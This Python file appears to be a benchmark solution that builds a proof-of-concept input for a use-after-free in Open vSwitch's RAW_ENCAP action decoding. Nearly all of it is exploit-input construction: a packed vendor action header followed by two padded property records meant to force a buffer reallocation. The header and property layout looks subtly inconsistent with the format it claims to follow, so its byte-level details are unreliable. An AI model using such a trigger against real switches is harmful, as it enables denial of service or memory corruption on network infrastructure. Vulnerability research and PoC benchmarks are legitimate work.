import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Open vSwitch
        NXAST_RAW_ENCAP decoding.
        
        The vulnerability (CVE-2022-3209) occurs when decode_ed_prop() causes the output 
        ofpbuf to reallocate, invalidating the 'encap' pointer held by decode_NXAST_RAW_ENCAP.
        To trigger this, we construct a RAW_ENCAP action with properties that add enough data
        to force a buffer reallocation.
        
        Target Input Length: 72 bytes
        Structure:
        - NXAST_RAW_ENCAP Header (16 bytes)
        - Properties (56 bytes)
        """
        
        # Constants
        OFPAT_VENDOR = 0xFFFF
        NX_VENDOR_ID = 0x00002320
        NXAST_RAW_ENCAP = 46
        
        # Total action length
        ACTION_LEN = 72
        
        # 1. Action Header (16 bytes)
        # Layout: Type(2), Length(2), Vendor(4), Subtype(2), Pad(6)
        # struct nx_action_raw_encap
        header = struct.pack('!HHIH', OFPAT_VENDOR, ACTION_LEN, NX_VENDOR_ID, NXAST_RAW_ENCAP)
        header += b'\x00' * 6  # Pad to 64-bit alignment
        
        # 2. Properties (56 bytes total available)
        # We need valid properties that cause data to be written to the output buffer.
        
        # Property 1: IPv6 (Type 2)
        # Adds 40 bytes (IPv6 header size) to the output buffer.
        # TLV Header: Type(2), Len(2)
        # Payload: 40 bytes
        # Total Property Size: 44 bytes
        prop_ipv6_type = 2
        prop_ipv6_len = 44
        prop_ipv6 = struct.pack('!HH', prop_ipv6_type, prop_ipv6_len) + b'\x00' * 40
        
        # Property 2: UDP (Type 3)
        # Adds 8 bytes (UDP header size) to the output buffer.
        # TLV Header: Type(2), Len(2)
        # Payload: 8 bytes
        # Total Property Size: 12 bytes
        prop_udp_type = 3
        prop_udp_len = 12
        prop_udp = struct.pack('!HH', prop_udp_type, prop_udp_len) + b'\x00' * 8
        
        # 3. Assemble PoC
        # Total size: 16 (Header) + 44 (IPv6) + 12 (UDP) = 72 bytes
        poc = header + prop_ipv6 + prop_udp
        
        return poc
